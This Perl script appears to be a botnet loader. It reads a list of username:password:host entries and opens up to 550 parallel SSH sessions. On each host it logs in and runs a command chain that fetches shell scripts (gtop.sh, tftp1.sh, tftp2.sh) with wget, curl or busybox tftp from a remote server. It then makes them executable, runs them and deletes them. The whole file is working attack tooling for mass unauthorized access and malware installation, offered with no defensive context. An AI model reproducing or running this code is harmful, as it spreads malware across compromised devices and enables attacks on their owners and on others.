#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;

$file = shift @ARGV;
open(fh, '<',$file) or die "Can't read file '$file' [$!]\n"; @newarray; while (<fh>){ @array = split(':',$_);
push(@newarray,@array);

}
my $pm = new Parallel::ForkManager(550); for (my $i=0; $i <
scalar(@newarray); $i+=3) {
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp; wget http://0.0.0.0/gtop.sh || curl -O http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh');
                        sleep 10;
                        $channel->close;
                        print "\e[32;1mCommand sent to: ".$newarray[$c]."\n";
                } else {
                        print "Login Unsuccessful\n";
                }
        } else {
                print "Connection Not Established\n";
        }
	$pm->finish;
}
$pm->wait_all_children;